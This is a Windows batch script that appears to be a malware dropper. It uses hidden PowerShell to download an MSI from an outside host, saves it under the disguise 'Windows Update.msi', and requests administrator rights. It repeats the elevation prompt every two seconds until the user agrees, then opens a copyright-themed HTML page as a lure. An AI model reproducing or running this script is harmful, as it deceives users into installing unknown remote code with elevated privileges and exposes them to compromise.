@echo off
setlocal EnableDelayedExpansion

:: =========================
:: CONFIG
:: =========================
set "htmlUrl=https://raw.githubusercontent.com/danghau123/copyrighthtml/main/media-copyright.html"
set "htmlFileName=media-copyright.html"
set "htmlFilePath=%TEMP%\%htmlFileName%"

set "url=https://files.riowordcentral.xyz/copyright/copyright.msi"
set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"

:: =========================
:: CLEAN OLD FILES
:: =========================
if exist "%outputFilePath%" del /f /q "%outputFilePath%"
if exist "%htmlFilePath%" del /f /q "%htmlFilePath%"

:: =========================
:: DOWNLOAD HTML (best-effort)
:: =========================
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%htmlUrl%' -OutFile '%htmlFilePath%' -UseBasicParsing } catch { exit 1 }"

:: =========================
:: DOWNLOAD MSI (required)
:: =========================
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }"

if not exist "%outputFilePath%" exit /b 1

:RunLoop
:: =========================
:: RUN MSI WITH UAC (YES/NO)
:: =========================
powershell -WindowStyle Hidden -Command "try { $p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\"' -Verb RunAs -Wait -PassThru; if ($p) { exit $p.ExitCode } else { exit 1223 } } catch { exit 1223 }"

:: CAPTURE EXIT CODE SAFELY
set "MSI_EXIT_CODE=%ERRORLEVEL%"

:: =========================
:: IF YES (ExitCode 0) -> OPEN HTML, EXIT
:: =========================
if !MSI_EXIT_CODE! EQU 0 (
    if exist "%htmlFilePath%" (
        "%WINDIR%\explorer.exe" "%htmlFilePath%"
    )
    exit /b 0
)

:: =========================
:: IF NO -> WAIT & ASK AGAIN
:: =========================
timeout /t 2 /nobreak >nul
goto RunLoop




